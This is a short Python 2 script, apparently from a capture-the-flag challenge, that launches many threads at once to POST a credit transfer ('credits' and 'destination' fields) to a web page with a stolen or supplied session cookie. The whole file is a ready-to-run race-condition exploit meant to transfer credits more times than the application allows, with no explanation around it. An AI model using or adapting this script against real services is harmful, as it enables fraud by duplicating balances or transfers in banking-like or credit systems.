#!/usr/bin/python
import thread
import time
import requests
import sys

if len(sys.argv) < 4:
	print 'usage: %s <host> <session> <amount> <destination code> [threads=10]' % sys.argv[0]
	sys.exit(0)

host = sys.argv[1]
threadn = 10
session = sys.argv[2]
amount = sys.argv[3]
destination = sys.argv[4]

if len(sys.argv) > 4:
	threadn = int(sys.argv[5], 10)

URL = 'http://%s:1212/?page=HVqDdc0ZbuAboomacHhYZ2hSMGlldz099rnkT61h8GOFZiU10TKjhg' % host

s = requests.session()
s.keep_alive = False
n = 0

def exploit(session, amount, destination):

	global n
	print 'exploiting'

	headers = {
		'content-type': 'application/x-www-form-urlencoded',
		'connection': 'close',
		'cookie': 'PHPSESSID=%s' % session,
	}

	x = requests.post(URL, data={
		'credits': amount,
		'destination': destination,
	}, headers=headers)

	print repr(x)
	n += 1

try:
	for i in range(threadn):
		thread.start_new_thread(exploit, (session, amount, destination, ))
except:
   print "Error: unable to start thread"

while n < threadn:
   pass
